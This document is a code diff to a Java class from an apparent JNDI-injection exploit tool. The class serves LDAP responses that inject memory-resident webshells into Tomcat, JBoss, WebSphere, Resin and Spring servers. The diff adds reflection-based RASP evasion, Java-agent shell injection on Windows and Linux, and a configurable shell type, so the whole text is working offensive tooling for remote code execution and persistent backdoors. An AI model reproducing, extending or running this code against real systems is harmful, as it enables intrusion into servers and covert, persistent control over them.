@@ -6,6 +6,7 @@ import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
 import com.nu1r.jndi.gadgets.utils.InjShell;
 import com.nu1r.jndi.template.*;
+import com.nu1r.jndi.template.Agent.WinMenshell;
 import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
 import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
@@ -28,17 +29,13 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.lang.reflect.InvocationTargetException;
+
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
+import static com.nu1r.jndi.gadgets.utils.InjShell.*;
 import static com.nu1r.jndi.utils.Config.*;
-import static com.nu1r.jndi.utils.Util.isHave;
 import static org.fusesource.jansi.Ansi.ansi;
 
-/*
-   注意：在 Javascript 引擎时，直接使用 sun.misc.Base64Decoder 和 org.apache.tomcat.util.buf.Base64 均会抛出异常
-
-    * Requires:
-    *   - Tomcat 8+ or SpringBoot 1.2.x+ in classpath
- */
 
 @LdapMapping(uri = {"/tomcatbypass"})
 public class TomcatBypassController implements LdapController {
@@ -158,7 +155,7 @@ public class TomcatBypassController implements LdapController {
 
             try {
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + payloadType));
+                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA PaylaodType >> |@" + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -168,36 +165,41 @@ public class TomcatBypassController implements LdapController {
                 if (thirdIndex < 0) thirdIndex = base.length();
                 try {
                     gadgetType = gadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Payload >> |@" + gadgetType));
                 } catch (IllegalArgumentException e) {
                     throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                 }
             }
 
-            switch (gadgetType) {
-                case urlr:
-                    String url1 = Util.getCmdFromBase(base);
-                    int result1 = url1.indexOf("-");
-                    if (result1 != -1) {
-                        String[] U = url1.split("-");
-                        int      i = U.length;
-                        if (i >= 1) {
-                            URL_PATTERN = U[0];
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + U[0]));
-                        }
-                        if (i >= 2) {
-                            Shell_Type = U[1];
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
-                        }
-                        if (i >= 3) {
-                            IS_OBSCURE = true;
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP >> |@" + U[2]));
-                        }
-                    } else {
-                        URL_PATTERN = url1;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
+            if (gadgetType == GadgetType.urlr) {
+                String url1    = Util.getCmdFromBase(base);
+                int    result1 = url1.indexOf("-");
+                if (result1 != -1) {
+                    String[] U = url1.split("-");
+                    int      i = U.length;
+                    if (i >= 1) {
+                        URL_PATTERN = U[0];
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + U[0]));
                     }
-                    break;
+                    if (i >= 2) {
+                        Shell_Type = U[1];
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
+                    }
+                    if (url1.contains("obscure")) {
+                        IS_OBSCURE = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@"));
+                    }
+                    if (url1.contains("winAgent")) {
+                        winAgent = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
+                    }
+                    if (url1.contains("linAgent")) {
+                        linAgent = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
+                    }
+                } else {
+                    URL_PATTERN = url1;
+                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellUrl >> |@" + url1));
+                }
             }
 
             switch (payloadType) {
@@ -295,8 +297,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TFMSFromJMXF.class));
             CtClass ctClass = pool.get(TFMSFromJMXF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -304,8 +314,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
             CtClass ctClass = pool.get(TFMSFromThreadF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -313,8 +331,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
             CtClass ctClass = pool.get(TLMSFromJMXLi.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -322,8 +348,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
             CtClass ctClass = pool.get(TLMSFromThreadLi.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -331,8 +365,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
             CtClass ctClass = pool.get(TSMSFromJMXS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -340,8 +382,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
             CtClass ctClass = pool.get(TSMSFromThreadS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -349,8 +399,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
             CtClass ctClass = pool.get(JBFMSFromContextF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -358,8 +416,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
             CtClass ctClass = pool.get(JBSMSFromContextS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -367,8 +433,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
             CtClass ctClass = pool.get(JFMSFromJMXF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -376,8 +450,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
             CtClass ctClass = pool.get(JSMSFromJMXS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -387,6 +469,14 @@ public class TomcatBypassController implements LdapController {
             CtClass ctClass = pool.get(WSFMSFromThread.class.getName());
             InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -396,6 +486,14 @@ public class TomcatBypassController implements LdapController {
             CtClass ctClass = pool.get(TWSMSFromThread.class.getName());
             InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -420,6 +518,14 @@ public class TomcatBypassController implements LdapController {
             ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
             classBytes = ctClass.toBytecode();
             clazzName = SpringInterceptorMS.class.getName() + System.nanoTime();
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectShell(classBytes, clazzName);
         }
 
@@ -427,8 +533,16 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
             CtClass ctClass = pool.get(RFMSFromThreadF.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
@@ -436,17 +550,35 @@ public class TomcatBypassController implements LdapController {
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
             CtClass ctClass = pool.get(RSMSFromThreadS.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
+        // 该处可能有问题，需要一次调试
         public String injectTomcatUpgrade() throws Exception {
+            Config.init();
             ClassPool pool = ClassPool.getDefault();
             pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
             CtClass ctClass = pool.get(TUGMSFromJMXuP.class.getName());
-            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "bx");
+            InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
             ctClass.setName(generateClassName());
+            if (winAgent){
+                TinsertWinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
+            if (linAgent){
+                TinsertLinAgent(ctClass);
+                return injectClass(WinMenshell.class);
+            }
             return injectClass(ctClass.getClass());
         }
 
